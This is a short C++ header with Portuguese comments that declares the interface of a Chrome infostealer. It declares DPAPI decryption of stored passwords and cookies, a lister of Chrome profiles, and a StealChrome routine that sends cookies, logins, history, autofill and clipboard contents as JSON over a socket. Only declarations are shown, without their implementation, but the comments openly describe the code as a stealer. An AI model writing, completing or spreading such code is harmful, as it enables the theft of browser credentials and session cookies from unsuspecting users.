#pragma once

#include <windows.h>
#include <vector>
#include <string>
#include <winsock2.h>

// DPAPI decrypt layer (usado em chrome steals)
std::string DPAPIDecrypt(const std::vector<BYTE>& data);       // Decripta valores binários (senha/cookies/etc)

// Perfis do Chrome/multi-user/local storage
std::vector<std::string> GetChromeProfiles();                  // Lista todos perfis do Chrome

// Stealer turbo — manda dump no socket (modo: "all", pode expandir: cookies, logins, history, autofills, clipboard)
void StealChrome(SOCKET sock, std::string mode = "all");       // Executa stealer Chrome, envia JSON pelo socket